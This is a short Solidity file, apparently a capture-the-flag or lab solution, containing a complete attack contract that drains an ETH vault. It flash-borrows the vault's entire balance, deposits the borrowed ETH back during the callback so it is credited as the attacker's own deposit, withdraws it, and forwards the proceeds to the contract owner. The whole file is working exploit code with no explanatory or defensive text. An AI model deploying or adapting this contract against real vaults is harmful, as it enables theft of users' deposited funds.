// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function depositETH() external payable;

    function withdrawETH() external;

    function flashLoanETH(uint256 amount) external;
}

contract AttackAdvancedVault {
    IVault private vault;
    address private owner;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attack() external {
        vault.flashLoanETH(address(vault).balance);
        vault.withdrawETH();
    }

    function callBack() external payable {
        vault.depositETH{value: msg.value}();
    }

    receive() external payable {
        payable(owner).transfer(address(this).balance);
    }
}
